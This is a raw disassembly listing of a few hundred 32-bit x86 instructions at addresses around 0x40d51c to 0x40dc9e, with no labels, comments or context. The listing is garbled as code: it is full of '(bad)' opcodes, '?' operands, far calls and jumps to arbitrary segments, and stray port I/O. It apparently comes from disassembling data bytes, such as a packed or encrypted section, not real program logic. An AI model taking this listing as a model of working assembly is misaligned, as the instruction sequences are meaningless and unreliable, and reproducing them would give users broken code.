  40d51c:	ins    BYTE PTR es:[edi],dx
  40d51d:	stos   DWORD PTR es:[edi],eax
  40d51e:	(bad)  [esi-0x24898123]
  40d524:	add    eax,0x601e9ab1
  40d529:	in     eax,0x9c
  40d52b:	pop    DWORD PTR [ecx]
  40d52d:	std    
  40d52e:	jle    0x40d541
  40d530:	mov    bl,ah
  40d532:	dec    esi
  40d533:	mov    BYTE PTR [eax+0x1c2005ea],bl
  40d539:	adc    BYTE PTR [eax-0x42],cl
  40d53c:	popf   
  40d53d:	data16 jge 0x40d5b2
  40d540:	push   eax
  40d541:	and    edi,DWORD PTR [ebx+eiz*2]
  40d544:	sbb    DWORD PTR [ebx-0x3459256a],ebx
  40d54a:	dec    esi
  40d54b:	or     esp,DWORD PTR [edx]
  40d54d:	inc    edx
  40d54e:	out    dx,eax
  40d54f:	or     dl,dh
  40d551:	out    dx,al
  40d552:	and    BYTE PTR ds:0x286c1a68,bh
  40d558:	sub    edx,edi
  40d55a:	pop    ecx
  40d55b:	xchg   DWORD PTR [eax-0x50e86fa3],edi
  40d561:	out    dx,al
  40d562:	jmp    0x40d4e4
  40d564:	mov    bl,0x96
  40d566:	push   esi
  40d567:	xchg   esi,eax
  40d568:	lods   al,BYTE PTR ds:[esi]
  40d569:	les    ebx,FWORD PTR [eax+0x5e311dd8]
  40d56f:	retf   0xda80
  40d572:	(bad)  
  40d573:	and    BYTE PTR [edx+0x53],bh
  40d576:	jmp    0x986f2a9f
  40d57b:	mov    ebp,0xfaf1acbb
  40d580:	call   0x5cdc:0x444904d9
  40d587:	xor    esi,DWORD PTR [edx]
  40d589:	inc    edx
  40d58a:	push   ds
  40d58b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d58c:	lea    ebp,[eax+ebp*8-0x6a7f407a]
  40d593:	cmc    
  40d594:	xchg   edx,eax
  40d595:	pop    es
  40d596:	and    BYTE PTR [edi+0x5d],dl
  40d599:	jbe    0x40d5dc
  40d59b:	xor    ebx,DWORD PTR [esi]
  40d59d:	test   al,0x4f
  40d59f:	out    dx,al
  40d5a0:	mov    DWORD PTR [eax],ebx
  40d5a2:	push   0x5f97b4a
  40d5a7:	ds std 
  40d5a9:	dec    esi
  40d5aa:	ja     0x40d53c
  40d5ac:	(bad)  
  40d5ad:	pop    ss
  40d5ae:	in     eax,0xdb
  40d5b0:	jl     0x40d53d
  40d5b2:	jecxz  0x40d5fd
  40d5b4:	xchg   esp,eax
  40d5b5:	pushf  
  40d5b6:	in     eax,0x15
  40d5b8:	push   es
  40d5b9:	ja     0x40d5ba
  40d5bb:	mov    esi,0x7e484535
  40d5c0:	xchg   esp,eax
  40d5c1:	inc    edi
  40d5c2:	mov    DWORD PTR [ecx],esi
  40d5c4:	jo     0x40d611
  40d5c6:	xchg   ebx,eax
  40d5c7:	sub    ebp,DWORD PTR [eax+0x54922290]
  40d5cd:	pop    esi
  40d5ce:	ds cmc 
  40d5d0:	cmp    bh,dh
  40d5d2:	pop    es
  40d5d3:	dec    esi
  40d5d4:	push   ecx
  40d5d5:	adc    ebp,DWORD PTR [ebp+0x7a]
  40d5d8:	mov    fs,WORD PTR [ebx+0x74e29855]
  40d5de:	mov    ah,BYTE PTR [esi-0x6c]
  40d5e1:	retf   0x3fb8
  40d5e4:	fbld   TBYTE PTR [ebp+0x6e]
  40d5e7:	mov    ecx,0xb02cb885
  40d5ec:	addr16 icebp 
  40d5ee:	xor    DWORD PTR [ebx+esi*8-0x5c],0xc
  40d5f3:	call   0xc4df6420
  40d5f8:	repnz mov ds:0xf6114309,eax
  40d5fe:	retf   
  40d5ff:	add    edx,ebx
  40d601:	int3   
  40d602:	(bad)
  40d605:	push   cs
  40d606:	jae    0x40d669
  40d608:	mov    dl,0x96
  40d60a:	xchg   esi,eax
  40d60b:	leave  
  40d60c:	repz jb 0x40d611
  40d60f:	repz jne 0x40d646
  40d612:	push   esi
  40d613:	std    
  40d614:	aam    0x48
  40d616:	jmp    0x40d5a7
  40d618:	adc    dl,BYTE PTR [eax]
  40d61a:	pusha  
  40d61b:	das    
  40d61c:	inc    ebx
  40d61d:	add    al,0x74
  40d61f:	test   DWORD PTR [ebx],0x65f47dde
  40d625:	popa   
  40d626:	or     ebp,DWORD PTR [edx-0x62]
  40d629:	adc    BYTE PTR [eax+0x1aeae591],ch
  40d62f:	push   eax
  40d630:	xchg   esi,eax
  40d631:	inc    esp
  40d632:	cmp    ecx,DWORD PTR gs:[ebx+0x1d690a9d]
  40d639:	pop    esi
  40d63a:	sbb    BYTE PTR ds:0xb44c9519,dh
  40d640:	mov    BYTE PTR [esi-0x42b9b0ca],cl
  40d646:	xchg   esi,eax
  40d647:	iret   
  40d648:	sbb    BYTE PTR [esi+0x14fadf9d],0x70
  40d64f:	xchg   edi,eax
  40d650:	mov    ds:0xd2b2343c,eax
  40d655:	or     bl,bl
  40d657:	out    0x3d,eax
  40d659:	sbb    BYTE PTR [esi],ch
  40d65b:	jp     0x40d5f8
  40d65d:	jno    0x40d66d
  40d65f:	pop    esp
  40d660:	and    eax,0x18365079
  40d665:	xchg   esp,eax
  40d666:	add    edx,DWORD PTR [edi+0x1e]
  40d669:	mov    dh,0xd2
  40d66b:	pop    ebp
  40d66c:	ret    
  40d66d:	cmp    DWORD PTR [ebx],edi
  40d66f:	cld    
  40d670:	mov    esi,eax
  40d672:	mov    edi,DWORD PTR [eax-0x2c]
  40d675:	push   ds
  40d676:	adc    DWORD PTR [ecx-0x6e5055f8],esi
  40d67c:	or     BYTE PTR [edx-0x765bf05e],ch
  40d682:	inc    ebx
  40d683:	push   ecx
  40d684:	push   edx
  40d685:	jne    0x40d6a8
  40d687:	xor    eax,edx
  40d689:	imul   esp,DWORD PTR ds:0xeeb176bf,0xcad10e31
  40d693:	mov    al,0x9c
  40d695:	add    al,0x44
  40d697:	adc    ecx,DWORD PTR [esi-0x17d090d0]
  40d69d:	bound  ebx,QWORD PTR [edx-0x48c79994]
  40d6a3:	nop
  40d6a4:	push   ss
  40d6a5:	aam    0xa
  40d6a7:	jecxz  0x40d69a
  40d6a9:	loope  0x40d676
  40d6ab:	fsubrp st(4),st
  40d6ad:	popa   
  40d6ae:	in     eax,dx
  40d6af:	or     dh,bl
  40d6b1:	cmp    BYTE PTR [ebx+0x59d3544e],dl
  40d6b7:	cmp    ah,dl
  40d6b9:	xchg   DWORD PTR [ecx+0x18],ecx
  40d6bc:	fnstenv [ebp+ebp*8-0x9]
  40d6c0:	sub    eax,0xbf094f61
  40d6c5:	pop    ecx
  40d6c6:	add    eax,0x6e305db
  40d6cb:	cld    
  40d6cc:	mov    ebp,0x703768a0
  40d6d1:	pop    edi
  40d6d2:	push   ss
  40d6d3:	jbe    0x40d65b
  40d6d5:	into   
  40d6d6:	sbb    DWORD PTR [ecx],esp
  40d6d8:	rcr    edi,1
  40d6da:	repnz fwait
  40d6dc:	and    ecx,DWORD PTR [ebp+0x2d]
  40d6df:	xchg   ebx,eax
  40d6e0:	je     0x40d6c0
  40d6e2:	fstp   QWORD PTR [edx+edi*2-0x75]
  40d6e6:	or     BYTE PTR [ebp-0x780c499d],cl
  40d6ec:	inc    edx
  40d6ed:	ss inc edi
  40d6ef:	push   0xffffffc5
  40d6f1:	call   0x3a7b:0xf7dea2fb
  40d6f8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d6f9:	(bad)  
  40d6fa:	(bad)  
  40d6fb:	sub    DWORD PTR [ecx-0x6d6e2df7],esi
  40d701:	jbe    0x40d68b
  40d703:	rcl    BYTE PTR [edx],0x2d
  40d706:	mov    eax,0xef99f7ed
  40d70b:	out    0x9e,eax
  40d70d:	data16 in al,dx
  40d70f:	inc    ecx
  40d710:	cmp    al,0x7a
  40d712:	xchg   edx,eax
  40d713:	xchg   esp,edx
  40d715:	add    esp,eax
  40d717:	mov    WORD PTR [eax],si
  40d71a:	sub    al,0xd7
  40d71c:	aaa    
  40d71d:	frstor ds:0x6e563ffd
  40d723:	push   ecx
  40d724:	imul   ebx,DWORD PTR [edi-0x29f1e4cf],0xffffff91
  40d72b:	icebp  
  40d72c:	ins    DWORD PTR es:[edi],dx
  40d72d:	call   0xc802:0x90c5c518
  40d734:	mov    ah,0xe4
  40d736:	ret    
  40d737:	add    esp,DWORD PTR [esi-0x6e]
  40d73a:	out    0x55,eax
  40d73c:	pop    es
  40d73d:	pop    ss
  40d73e:	jmp    0xccdda50a
  40d743:	mov    ecx,0x127106e5
  40d748:	js     0x40d729
  40d74a:	in     al,dx
  40d74b:	or     eax,0xd0a56642
  40d750:	(bad)  
  40d751:	(bad)  
  40d752:	in     al,dx
  40d753:	int    0x13
  40d755:	xchg   ecx,eax
  40d756:	in     eax,dx
  40d757:	dec    esp
  40d758:	push   ebx
  40d759:	sub    ebx,ebp
  40d75b:	xchg   DWORD PTR [esi+0x64],eax
  40d75e:	add    bh,ch
  40d760:	push   ecx
  40d761:	(bad)  
  40d763:	shl    DWORD PTR [esi+0x3d],0xec
  40d767:	inc    esi
  40d768:	lock mov al,ds:0xa9771cf2
  40d76f:	sbb    al,0xb8
  40d771:	xchg   esi,eax
  40d772:	lahf   
  40d773:	xlat   BYTE PTR ds:[ebx]
  40d774:	cld    
  40d775:	push   edx
  40d776:	dec    esp
  40d777:	imul   edi,DWORD PTR [esi-0x37],0x6d2b11bb
  40d77e:	adc    bl,BYTE PTR [edi]
  40d780:	sbb    ebp,DWORD PTR [edi+0x47]
  40d783:	push   edx
  40d784:	ja     0x40d7ff
  40d786:	adc    eax,0xf7aa6e59
  40d78b:	pop    ebp
  40d78c:	cmp    ecx,0x41113fe2
  40d792:	mov    WORD PTR [edi+edx*4+0x16],gs
  40d796:	mov    edx,0xd8bd3a61
  40d79b:	sub    al,0x9
  40d79d:	cmp    ah,BYTE PTR ds:0xe984d6df
  40d7a3:	jbe    0x40d72c
  40d7a5:	ret    
  40d7a6:	sub    BYTE PTR [edx+0x31],0xa4
  40d7aa:	retf   0x8056
  40d7ad:	xchg   BYTE PTR [edx+0x44],cl
  40d7b0:	int    0xcd
  40d7b2:	clc    
  40d7b3:	sub    dh,dl
  40d7b5:	adc    dl,ch
  40d7b7:	(bad)  
  40d7b9:	inc    edi
  40d7ba:	jle    0x40d814
  40d7bc:	repnz mov ss,WORD PTR [eax+0x386c96c]
  40d7c3:	call   0x7f3f:0x8a018561
  40d7ca:	imul   DWORD PTR [edi]
  40d7cc:	xor    BYTE PTR [eax-0x415523cb],dh
  40d7d2:	aaa    
  40d7d3:	cs fs test eax,0xe680b728
  40d7da:	and    eax,DWORD PTR [eax]
  40d7dc:	add    ebx,ecx
  40d7de:	in     al,dx
  40d7df:	mov    cl,0x4c
  40d7e1:	xor    BYTE PTR [ebp-0x34f3bac6],ch
  40d7e7:	jmp    0x40d7ed
  40d7e9:	fldenv [esi+eax*8-0x19]
  40d7ed:	fsub   DWORD PTR [ecx]
  40d7ef:	fstp   TBYTE PTR [eax+0x57784fde]
  40d7f5:	jmp    0x40d84c
  40d7f7:	sub    edi,DWORD PTR ds:0xec55c56f
  40d7fd:	fdivr  QWORD PTR [eax+0x50]
  40d800:	cdq    
  40d801:	test   DWORD PTR [ebp-0x22071acd],edi
  40d807:	div    DWORD PTR [edi-0x3b3358de]
  40d80d:	xchg   BYTE PTR [esi+0x3c],bh
  40d810:	stos   BYTE PTR es:[edi],al
  40d811:	daa    
  40d812:	cdq    
  40d813:	adc    edi,ebx
  40d815:	xor    al,0x64
  40d817:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d818:	pandn  mm1,mm6
  40d81b:	arpl   WORD PTR [ebx],dx
  40d81d:	ins    BYTE PTR es:[edi],dx
  40d81e:	call   0xcc35:0xdd56da34
  40d825:	jmp    0x40d825
  40d827:	push   ebx
  40d828:	fsubr  QWORD PTR [ecx]
  40d82a:	mov    dl,0x21
  40d82c:	enter  0x71f8,0x3d
  40d830:	fs and dl,dh
  40d833:	mov    al,cl
  40d835:	add    dh,0x1b
  40d838:	ins    DWORD PTR es:[edi],dx
  40d839:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d83a:	push   eax
  40d83b:	inc    esp
  40d83c:	pop    ebx
  40d83d:	or     BYTE PTR [edx+0x4ffcd138],bl
  40d843:	clc    
  40d844:	mov    dl,0xb0
  40d846:	jbe    0x3f09d7a2
  40d84c:	push   ebp
  40d84d:	ss cld 
  40d84f:	int    0x24
  40d851:	ja     0x40d8c4
  40d853:	and    al,0x50
  40d855:	ds pop ebx
  40d857:	out    0x39,al
  40d859:	push   ecx
  40d85a:	call   0x6769dfde
  40d85f:	mov    ecx,0x4638dc77
  40d864:	jmp    0xb3785d0d
  40d869:	addr16 jmp 0xeecbcbbe
  40d86f:	iret   
  40d870:	sbb    dl,bl
  40d872:	mov    ?,WORD PTR [esi+0x3a]
  40d875:	xchg   edi,eax
  40d876:	loop   0x40d890
  40d878:	sub    ah,dh
  40d87a:	dec    ebx
  40d87b:	leave  
  40d87c:	push   edi
  40d87d:	push   esi
  40d87e:	jp     0x40d80f
  40d880:	shl    BYTE PTR [ebp+0x1eb2c1c1],0xba
  40d887:	pop    ecx
  40d888:	iret   
  40d889:	out    0x48,eax
  40d88b:	sub    eax,esp
  40d88d:	mov    ebx,0x54d03f5
  40d892:	into   
  40d893:	dec    edi
  40d894:	xor    ah,dl
  40d896:	adc    dl,ah
  40d898:	mov    eax,ecx
  40d89a:	jns    0x40d85a
  40d89c:	pop    es
  40d89d:	sbb    ebp,DWORD PTR [ecx-0x2]
  40d8a0:	mov    dl,0xb3
  40d8a2:	dec    ebx
  40d8a3:	dec    esi
  40d8a4:	mov    WORD PTR [eax-0x37],?
  40d8a7:	ins    DWORD PTR es:[edi],dx
  40d8a8:	push   ds
  40d8a9:	call   0xd0e6:0x465a3c2b
  40d8b0:	rcl    BYTE PTR [eax+0x37],cl
  40d8b3:	shr    BYTE PTR [edi+0x63],1
  40d8b6:	das    
  40d8b7:	or     al,0xe5
  40d8b9:	sbb    esp,edi
  40d8bb:	push   ss
  40d8bc:	test   al,0x53
  40d8be:	jle    0x40d8af
  40d8c0:	leave  
  40d8c1:	sbb    bl,BYTE PTR [eax+0x69]
  40d8c4:	pop    ds
  40d8c5:	cmp    BYTE PTR [edi+0x2b],bl
  40d8c8:	call   FWORD PTR [ebx]
  40d8ca:	jl     0x40d8e2
  40d8cc:	loope  0x40d85a
  40d8ce:	sar    DWORD PTR [eax-0x7a21e2e],cl
  40d8d4:	cmp    DWORD PTR [esi+0x4ae35829],0x1
  40d8db:	faddp  st(0),st
  40d8dd:	mov    dl,0xe9
  40d8df:	mov    ah,0xee
  40d8e1:	imul   edi,DWORD PTR [eax],0x2d
  40d8e4:	aaa    
  40d8e5:	div    DWORD PTR [edx+0x6fcd9384]
  40d8eb:	jle    0x40d922
  40d8ed:	jmp    0x995:0x5d42f25
  40d8f4:	sub    eax,0x6c98a004
  40d8f9:	push   ebx
  40d8fa:	cmp    eax,0xb81545b6
  40d8ff:	jp     0x40d922
  40d901:	shl    DWORD PTR [eax+eax*4-0xb],0xc3
  40d906:	div    edi
  40d908:	cmp    dl,cl
  40d90a:	lock call 0x2ec:0x89f1d9ee
  40d912:	sbb    eax,0x667b67ad
  40d917:	push   ds
  40d918:	jbe    0x40d8f0
  40d91a:	fisttp WORD PTR [edi]
  40d91c:	aam    0x88
  40d91e:	dec    eax
  40d91f:	clc    
  40d920:	lahf   
  40d921:	pop    ebp
  40d922:	in     eax,0xb0
  40d924:	aam    0x0
  40d926:	mov    cl,0x79
  40d928:	xor    DWORD PTR [ebx-0x505cc707],edx
  40d92e:	adc    eax,0x406c9663
  40d933:	cmp    al,0x6f
  40d935:	in     al,dx
  40d936:	xor    al,0xca
  40d938:	lahf   
  40d939:	or     BYTE PTR [eax-0x36],dh
  40d93c:	mul    BYTE PTR [ebx+ebx*2]
  40d93f:	mov    al,0xa4
  40d941:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d942:	add    DWORD PTR [edi],ebp
  40d944:	xor    bh,dh
  40d946:	stos   BYTE PTR es:[edi],al
  40d947:	arpl   WORD PTR [esi+0x72099533],bx
  40d94d:	or     ebx,DWORD PTR [ecx]
  40d94f:	xlat   BYTE PTR ds:[ebx]
  40d950:	inc    esi
  40d951:	shr    DWORD PTR [eax-0x22],cl
  40d954:	test   esp,0x9a3f6fd4
  40d95a:	outs   dx,DWORD PTR ds:[esi]
  40d95b:	xor    dl,0x65
  40d95e:	add    eax,0xd326e71f
  40d963:	mov    esi,0xcc982ed7
  40d968:	push   cs
  40d969:	xchg   DWORD PTR [edi+eiz*1+0x4e49d58d],ecx
  40d970:	mov    bh,0x3f
  40d972:	fsub   QWORD PTR [ecx-0x2c]
  40d975:	push   esp
  40d976:	push   esi
  40d977:	out    dx,eax
  40d978:	fnstenv gs:[edx+0x1b6ad973]
  40d97f:	dec    esi
  40d980:	shl    esp,1
  40d982:	(bad)  
  40d984:	imul   eax,DWORD PTR [eax-0x47],0x924ea08e
  40d98b:	test   eax,0x8885610f
  40d990:	pop    ebp
  40d991:	cli    
  40d992:	jecxz  0x40d9d4
  40d994:	(bad)  
  40d995:	out    dx,al
  40d996:	adc    eax,DWORD PTR ds:0xdeae4df4
  40d99c:	les    esp,FWORD PTR [esi]
  40d99e:	or     ebp,DWORD PTR [edi-0x2f]
  40d9a1:	push   ebp
  40d9a2:	out    dx,eax
  40d9a3:	dec    ebp
  40d9a4:	ja     0x40d9f7
  40d9a6:	mov    WORD PTR [ecx-0x6a],cs
  40d9a9:	pop    esi
  40d9aa:	mov    esi,0x7090784d
  40d9af:	push   ebx
  40d9b0:	xor    eax,0xefa8d169
  40d9b5:	cmp    edx,DWORD PTR [eax+ecx*8-0x47]
  40d9b9:	ror    BYTE PTR [ebx+ebp*1+0x2e],cl
  40d9bd:	enter  0xb346,0x23
  40d9c1:	cmp    eax,0x28c292a8
  40d9c6:	jb     0x40d9d9
  40d9c8:	retf   
  40d9c9:	add    DWORD PTR [edx+0x74],eax
  40d9cc:	sbb    DWORD PTR [ebx+ebx*4],ecx
  40d9cf:	and    edx,DWORD PTR [edi]
  40d9d1:	cmc    
  40d9d2:	shl    BYTE PTR [eax-0x73],1
  40d9d5:	push   ebx
  40d9d6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d9d7:	retf   
  40d9d8:	add    dh,BYTE PTR [ecx+0x5e0cf277]
  40d9de:	bound  edi,QWORD PTR [ebp-0x20b1d485]
  40d9e4:	retw   
  40d9e6:	lds    eax,FWORD PTR [ecx-0x5ab28432]
  40d9ec:	retf   0x1c62
  40d9ef:	lods   eax,DWORD PTR ds:[esi]
  40d9f0:	dec    eax
  40d9f1:	and    eax,0x837316bd
  40d9f6:	stos   BYTE PTR es:[edi],al
  40d9f7:	jns    0x40d9ea
  40d9f9:	xchg   ecx,eax
  40d9fa:	lods   eax,DWORD PTR ds:[esi]
  40d9fb:	dec    ecx
  40d9fc:	jo     0x40da11
  40d9fe:	inc    eax
  40d9ff:	rol    DWORD PTR [ebx],1
  40da01:	push   ebp
  40da02:	popa   
  40da03:	test   eax,0x85c9f65a
  40da08:	mov    WORD PTR [ebx-0x3fbfa1b1],ds
  40da0e:	dec    esp
  40da0f:	xlat   BYTE PTR ds:[ebx]
  40da10:	mov    edx,0x2036c45a
  40da15:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40da16:	xor    DWORD PTR [edx+0x2d926e9],esp
  40da1c:	xchg   DWORD PTR [eax+0x19867b6f],eax
  40da22:	shl    edi,1
  40da24:	dec    esp
  40da25:	rcl    DWORD PTR [edi-0x6],cl
  40da28:	mov    ecx,0x8e5b9f01
  40da2d:	je     0x40da38
  40da2f:	fnstsw WORD PTR ds:0x88e593dc
  40da35:	popf   
  40da36:	pop    ebp
  40da37:	stc    
  40da38:	imul   esi,DWORD PTR [esi],0x453eca43
  40da3e:	mov    bl,0x87
  40da40:	(bad)
  40da43:	mov    eax,0xe938be47
  40da48:	mov    bl,0x24
  40da4a:	cdq    
  40da4b:	push   ds
  40da4c:	aaa    
  40da4d:	sub    edi,DWORD PTR [ebx+0x66]
  40da50:	mov    edx,0xe517707f
  40da55:	inc    eax
  40da56:	cmp    al,0x52
  40da58:	gs mov ch,0x93
  40da5b:	(bad)  
  40da5c:	cmp    BYTE PTR [ebx+0x5a165ddc],dl
  40da62:	lea    ecx,[eax+0x2091251]
  40da68:	call   0x2783:0x949887c2
  40da6f:	out    dx,eax
  40da70:	mov    ecx,0xe0d94e0
  40da75:	loopne 0x40da6b
  40da77:	sub    eax,0x224b2057
  40da7c:	je     0x40da4a
  40da7e:	ins    DWORD PTR es:[edi],dx
  40da7f:	xchg   DWORD PTR [edi+0x77],esi
  40da82:	sub    dl,BYTE PTR [edi-0x77f5c2a9]
  40da88:	shl    DWORD PTR [edi+0x75],cl
  40da8b:	in     al,dx
  40da8c:	mov    bh,0x80
  40da8e:	into   
  40da8f:	sti    
  40da90:	out    0x40,al
  40da92:	cs and eax,0x9ea56a5f
  40da98:	jne    0x40da9e
  40da9a:	mov    ebx,0xb2282b65
  40da9f:	repz rol BYTE PTR [edx-0x724561f1],cl
  40daa6:	in     eax,0x6b
  40daa8:	and    edx,0x16
  40daab:	repnz add ebx,esp
  40daae:	neg    ah
  40dab0:	call   0x7e84039f
  40dab5:	shl    cl,0xe8
  40dab8:	(bad)  
  40dab9:	xchg   ebx,eax
  40daba:	hlt    
  40dabb:	mov    ebx,0xbc4f3ecf
  40dac0:	ret    
  40dac1:	ins    DWORD PTR es:[edi],dx
  40dac2:	aas    
  40dac3:	push   ebx
  40dac4:	and    bh,BYTE PTR [ebp+edi*1+0x35]
  40dac8:	lahf   
  40dac9:	enter  0x365a,0xe4
  40dacd:	fimul  WORD PTR [ebx]
  40dacf:	mov    BYTE PTR [ebx-0x5386642a],0x99
  40dad6:	push   edx
  40dad7:	or     eax,0xf962548a
  40dadc:	fs dec edx
  40dade:	scas   eax,DWORD PTR es:[edi]
  40dadf:	loopne 0x40db32
  40dae1:	sbb    DWORD PTR [esi-0x65967500],edx
  40dae7:	mov    cl,0x36
  40dae9:	jge    0x40da85
  40daeb:	cdq    
  40daec:	in     eax,dx
  40daed:	jae    0x40db42
  40daef:	cs pop ecx
  40daf1:	cmp    al,0x1d
  40daf3:	mov    dh,0xdf
  40daf5:	jbe    0x40db67
  40daf7:	outs   dx,DWORD PTR ds:[esi]
  40daf8:	sbb    esp,DWORD PTR [esi+edi*4]
  40dafb:	inc    ebp
  40dafc:	push   ss
  40dafd:	xor    eax,0x576da000
  40db02:	ins    DWORD PTR es:[edi],dx
  40db03:	ret    0x734
  40db06:	mov    al,0x6a
  40db08:	stos   DWORD PTR es:[edi],eax
  40db09:	cmp    ebx,DWORD PTR [eax-0x29]
  40db0c:	mov    eax,DWORD PTR [ebx+esi*4+0x6a]
  40db10:	clc    
  40db11:	xlat   BYTE PTR ds:[ebx]
  40db12:	fst    DWORD PTR [esp+eax*2-0x74dc3869]
  40db19:	jge    0x40db0c
  40db1b:	int3   
  40db1c:	and    dh,BYTE PTR [ecx+0x1f6e2757]
  40db22:	mov    cl,0x39
  40db24:	jae    0x40db4f
  40db26:	jne    0x40db9d
  40db28:	enter  0xc9b3,0xa4
  40db2c:	ret    
  40db2d:	xchg   edx,eax
  40db2e:	and    WORD PTR [esi+esi*1],si
  40db32:	pop    edi
  40db33:	jns    0x40dae4
  40db35:	cmp    BYTE PTR [eax],0x73
  40db38:	jno    0x40db50
  40db3a:	xor    BYTE PTR [ecx+0x42b201be],bh
  40db40:	int3   
  40db41:	stos   DWORD PTR es:[edi],eax
  40db42:	popa   
  40db43:	popf   
  40db44:	loope  0x40db5d
  40db46:	cmc    
  40db47:	xchg   ebx,eax
  40db48:	xchg   BYTE PTR [eax],dl
  40db4a:	push   edi
  40db4b:	int3   
  40db4c:	inc    edx
  40db4d:	push   es
  40db4e:	pop    eax
  40db4f:	dec    edx
  40db50:	outs   dx,BYTE PTR ds:[esi]
  40db51:	jl     0x40dbb7
  40db53:	and    DWORD PTR [esi],ecx
  40db55:	jmp    0x4551:0xa9ee2643
  40db5c:	adc    ah,BYTE PTR [edi]
  40db5e:	std    
  40db5f:	and    eax,0x33fdbe06
  40db64:	xor    BYTE PTR [edi+0x5fbe846e],cl
  40db6a:	call   0x3422:0x60dc39b9
  40db71:	pop    ebx
  40db72:	aad    0x34
  40db74:	inc    ebx
  40db75:	push   esp
  40db76:	and    al,0x92
  40db78:	in     al,0xcf
  40db7a:	sbb    edx,edx
  40db7c:	cmp    cl,BYTE PTR [esi]
  40db7e:	test   DWORD PTR [eax-0x7891c72b],esi
  40db84:	pop    es
  40db85:	pushf  
  40db86:	cwde   
  40db87:	xchg   esp,eax
  40db88:	or     eax,0x13333e30
  40db8d:	mov    ah,0x12
  40db8f:	imul   ecx,DWORD PTR [eax+0x26],0x20f64378
  40db96:	in     al,dx
  40db97:	pop    ss
  40db98:	push   0x8df0f351
  40db9d:	rcl    BYTE PTR [esi+ebp*4-0x78],cl
  40dba1:	xor    BYTE PTR [edx+0x61],ch
  40dba4:	sar    dl,cl
  40dba6:	outs   dx,DWORD PTR ds:[esi]
  40dba7:	fdiv   QWORD PTR [edx]
  40dba9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dbaa:	mov    bl,0x45
  40dbac:	mov    edi,0xad11f87e
  40dbb1:	dec    ebp
  40dbb2:	popf   
  40dbb3:	mov    al,0xf4
  40dbb5:	and    bl,BYTE PTR [ebx]
  40dbb7:	ds scas al,BYTE PTR es:[edi]
  40dbb9:	add    BYTE PTR [ebp+eiz*4+0x4e5763ff],dh
  40dbc0:	jbe    0x40dbd0
  40dbc2:	and    eax,0xdc170390
  40dbc7:	aad    0x20
  40dbc9:	ins    BYTE PTR es:[edi],dx
  40dbca:	nop
  40dbcb:	mov    edi,0x8b62ef8d
  40dbd0:	out    0x67,al
  40dbd2:	mov    bl,0x2c
  40dbd4:	inc    ecx
  40dbd5:	aad    0x8c
  40dbd7:	dec    edx
  40dbd8:	mov    ?,WORD PTR [edx]
  40dbda:	sbb    ecx,DWORD PTR [edx-0x37]
  40dbdd:	les    ecx,FWORD PTR [edi+0x1b]
  40dbe0:	pop    ss
  40dbe1:	ss dec edx
  40dbe3:	jecxz  0x40dba2
  40dbe5:	rcr    DWORD PTR [edx+ecx*1],1
  40dbe8:	mov    ah,dl
  40dbea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dbeb:	ins    DWORD PTR es:[edi],dx
  40dbec:	rol    BYTE PTR [esi],1
  40dbee:	jmp    0xcf5dc89c
  40dbf3:	xchg   ebx,eax
  40dbf4:	pop    es
  40dbf5:	popa   
  40dbf6:	xlat   BYTE PTR ds:[ebx]
  40dbf7:	ins    BYTE PTR es:[edi],dx
  40dbf8:	sub    ecx,0x7c
  40dbfb:	xor    ebx,DWORD PTR [esi]
  40dbfd:	js     0x40dc69
  40dbff:	pop    ebx
  40dc00:	aad    0xf7
  40dc02:	inc    esp
  40dc03:	stos   DWORD PTR es:[edi],eax
  40dc04:	bound  edx,QWORD PTR [eax+edi*1]
  40dc07:	sub    dh,dh
  40dc09:	pop    esp
  40dc0a:	dec    edi
  40dc0b:	xor    ah,BYTE PTR [ebp+ebp*4-0x263d36a0]
  40dc12:	lods   eax,DWORD PTR ds:[esi]
  40dc13:	jnp    0x40dbd4
  40dc15:	or     bh,BYTE PTR [edx+ecx*8]
  40dc18:	push   cs
  40dc19:	push   esp
  40dc1a:	(bad)  
  40dc1b:	lock push ds
  40dc1d:	or     eax,0xd2e168d0
  40dc22:	sar    DWORD PTR [ecx+0x7b],cl
  40dc25:	cdq    
  40dc26:	enter  0xbf72,0xb4
  40dc2a:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  40dc2c:	sti    
  40dc2d:	jge    0x40dbee
  40dc2f:	pushf  
  40dc30:	retf   
  40dc31:	adc    esi,DWORD PTR [edx-0x7c]
  40dc34:	in     al,dx
  40dc35:	push   ecx
  40dc36:	mov    ch,ch
  40dc38:	mov    fs,WORD PTR [eax+ebx*4]
  40dc3b:	and    al,0x57
  40dc3d:	int    0x23
  40dc3f:	aad    0x5
  40dc41:	inc    edx
  40dc42:	jmp    0x40dc04
  40dc44:	jmp    0xdf03:0x7a51eee1
  40dc4b:	rcl    DWORD PTR [ebx],cl
  40dc4d:	inc    edi
  40dc4e:	out    0x75,eax
  40dc50:	(bad)  [edi+edi*1+0x384390dd]
  40dc57:	and    DWORD PTR [eax-0x66af7a24],ebp
  40dc5d:	lods   al,BYTE PTR ds:[esi]
  40dc5e:	dec    edx
  40dc5f:	jmp    0x40dc4a
  40dc61:	std    
  40dc62:	cmc    
  40dc63:	mov    esp,0x270d87b7
  40dc69:	jge    0x40dcac
  40dc6b:	pop    ss
  40dc6c:	shr    BYTE PTR ds:0x970debcb,cl
  40dc72:	(bad)  
  40dc73:	xor    esi,DWORD PTR [eax]
  40dc75:	daa    
  40dc76:	mov    ds:0x15ab31bf,al
  40dc7b:	xchg   esp,eax
  40dc7c:	jae    0x40dcc3
  40dc7e:	(bad)  
  40dc7f:	xor    eax,0x429f4af1
  40dc84:	mov    dh,0x7d
  40dc86:	pop    es
  40dc87:	dec    ebx
  40dc88:	ret    0x7c4f
  40dc8b:	outs   dx,DWORD PTR ds:[esi]
  40dc8c:	xor    eax,0x17b34ac6
  40dc91:	push   ds
  40dc92:	popf   
  40dc93:	push   ecx
  40dc94:	in     al,dx
  40dc95:	cmp    DWORD PTR [edi],0xd12200e
  40dc9b:	mov    ch,0x10
  40dc9d:	outs   dx,BYTE PTR ds:[esi]
  40dc9e:	out    0x5b,al
